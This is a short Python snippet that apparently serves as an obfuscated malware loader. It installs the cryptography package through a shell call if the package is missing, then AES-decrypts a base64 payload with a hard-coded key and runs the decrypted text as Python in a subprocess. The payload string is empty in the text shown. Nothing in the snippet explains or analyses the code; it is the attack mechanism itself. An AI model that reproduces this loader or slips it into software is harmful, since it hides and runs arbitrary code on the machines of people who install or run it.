try:
        import cryptography
except ModuleNotFoundError:
        import os as key 
        key.system(str("pip install cryptography"))
dec = ""
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes; from cryptography.hazmat.backends import default_backend; from cryptography.hazmat.primitives import padding; import base64, subprocess; subprocess.Popen(['python', '-c', 
    padding.PKCS7(algorithms.AES.block_size).unpadder().update(
        Cipher(algorithms.AES(b'uBbUojK3SYPoTU1L'[:32]), modes.CBC(b'\x00' * 16), backend=default_backend())
        .decryptor().update(base64.b64decode(dec.encode())) + 
        Cipher(algorithms.AES(b'uBbUojK3SYPoTU1L'[:32]), modes.CBC(b'\x00' * 16), backend=default_backend())
        .decryptor().finalize()).decode().rstrip('\0')
    ], stdin=subprocess.PIPE).communicate()

